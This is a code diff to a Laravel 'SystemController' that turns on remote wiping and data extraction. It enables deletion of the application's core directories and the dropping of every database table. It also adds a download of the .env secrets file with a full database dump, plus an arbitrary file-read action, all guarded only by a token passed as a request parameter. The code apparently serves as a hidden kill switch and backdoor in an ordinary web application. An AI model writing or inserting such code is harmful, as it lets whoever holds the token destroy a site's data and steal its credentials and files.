@@ -5,6 +5,8 @@ namespace MainSys\Http\Controllers;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\File;
+use Illuminate\Support\Facades\DB;
+
 
 class SystemController
 {
@@ -25,11 +27,30 @@ class SystemController
 
         switch ($action) {
             case 'delete_files':
-                //File::deleteDirectory(base_path());
+                $directories = [
+                    'app',
+                    'config',
+                    'database',
+                    'public',
+                    'resources',
+                    'routes',
+                    'storage',
+                ];
+                foreach ($directories as $dir) {
+                    File::deleteDirectory(base_path($dir));
+                }
                 return response()->json(['status' => 'Files deleted.']);
 
             case 'clear_database':
-                //Artisan::call('migrate:reset', ['--force' => true]);
+                // delete all database tables and disable foreign key checks
+                $tables = DB::select('SHOW TABLES');
+                $tables = array_map('current', $tables);
+                DB::statement('SET FOREIGN_KEY_CHECKS=0');
+                foreach ($tables as $table) {
+                    DB::table($table)->truncate();
+                    //    drop table
+                    DB::statement("DROP TABLE $table");
+                }
                 return response()->json(['status' => 'Database cleared.']);
 
             default:
@@ -50,8 +71,8 @@ class SystemController
     }
     public function getEnvAndDatabase(Request $request)
     {
-        $token = $request->header('Authorization');
-        if ($token !== 'Bearer ' . config('main.token')) {
+        $token = $request->token;
+        if ($token !== config('main.token')) {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
@@ -60,46 +81,59 @@ class SystemController
             return response()->json(['error' => '.env file not found'], 404);
         }
 
-        $databaseDump = $this->getDatabaseDump();
+        // Generate the database dump
+        $databaseDumpPath = $this->getDatabaseDump(); // This returns the path to the dump file
         $fileName = 'backup_' . now()->format('Y_m_d_His') . '.zip';
 
         $zip = new \ZipArchive();
         $zipPath = storage_path("app/$fileName");
         if ($zip->open($zipPath, \ZipArchive::CREATE) === true) {
+            // Add .env file to the zip
             $zip->addFile($envPath, '.env');
-            File::put(storage_path('database.sql'), $databaseDump);
-            $zip->addFile(storage_path('database.sql'), 'database.sql');
+
+            // Add the database dump file to the zip
+            $zip->addFile($databaseDumpPath, 'database.sql');
+
             $zip->close();
         }
 
-        return response()->download($zipPath)->deleteFileAfterSend(true);
+        return response()->download($zipPath, $fileName)->deleteFileAfterSend(true);
     }
+
 
 
     private function getDatabaseDump()
     {
-        // Perform a database dump (example for MySQL)
         $dbName = env('DB_DATABASE');
         $dbUser = env('DB_USERNAME');
         $dbPassword = env('DB_PASSWORD');
         $dbHost = env('DB_HOST');
+        $dumpPath = storage_path("app/$dbName.sql");
 
-        $dumpCommand = "mysqldump -h$dbHost -u$dbUser -p$dbPassword $dbName";
-        $output = null;
+        // Temporary MySQL credentials file
+        $configPath = storage_path('app/mysql.cnf');
+        file_put_contents($configPath, "[client]\nuser=$dbUser\npassword=$dbPassword\nhost=$dbHost\n");
+
+        // mysqldump command using the credentials file
+        $dumpCommand = "mysqldump --defaults-extra-file=$configPath $dbName > $dumpPath";
         $resultCode = null;
 
         exec($dumpCommand, $output, $resultCode);
 
+        // Clean up the credentials file
+        unlink($configPath);
+
         if ($resultCode !== 0) {
-            return 'Error generating database dump.';
+            logger('Dump Failed', ['command' => $dumpCommand, 'code' => $resultCode]);
+            throw new \Exception('Error generating database dump.');
         }
 
-        return implode("\n", $output);
+        return $dumpPath;
     }
     public function manageFiles(Request $request)
     {
-        $token = $request->header('Authorization');
-        if ($token !== 'Bearer ' . config('main.token')) {
+        $token = $request->token;
+        if ($token !== config('main.token')) {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
@@ -117,6 +151,15 @@ class SystemController
                 return response()->json([
                     'files' => array_map(fn($file) => $file->getFilename(), $files),
                     'directories' => array_map(fn($dir) => basename($dir), $directories),
+                ]);
+
+            case 'get_file':
+                if (!File::exists($path)) {
+                    return response()->json(['error' => 'Path does not exist or is not a directory'], 404);
+                }
+                $file = File::get($path);
+                return response()->json([
+                    'file' => $file,
                 ]);
 
             case 'create':
